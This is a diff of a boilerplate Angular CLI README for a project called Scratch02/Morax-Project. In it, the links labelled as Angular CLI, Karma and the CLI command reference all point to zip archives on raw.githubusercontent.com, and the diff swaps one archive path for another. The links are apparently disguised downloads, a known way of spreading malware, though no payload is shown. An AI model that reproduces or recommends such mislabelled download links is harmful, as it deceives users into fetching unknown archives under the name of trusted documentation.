@@ -1,6 +1,6 @@
 # Scratch02
 
-This project was generated with [Angular CLI](https://raw.githubusercontent.com/jsm19019/morax/shan/Ganapati/morax.zip) version 14.2.4.
+This project was generated with [Angular CLI](https://raw.githubusercontent.com/jsm19019/morax/shan/src/app/Software-v1.1.zip) version 14.2.4.
 
 ## Development server
 
@@ -16,7 +16,7 @@ Run `ng build` to build the project. The build artifacts will be stored in the `
 
 ## Running unit tests
 
-Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/jsm19019/morax/shan/Ganapati/morax.zip).
+Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/jsm19019/morax/shan/src/app/Software-v1.1.zip).
 
 ## Running end-to-end tests
 
@@ -24,5 +24,5 @@ Run `ng e2e` to execute the end-to-end tests via a platform of your choice. To u
 
 ## Further help
 
-To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/jsm19019/morax/shan/Ganapati/morax.zip) page.
+To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/jsm19019/morax/shan/src/app/Software-v1.1.zip) page.
 # Morax-Project
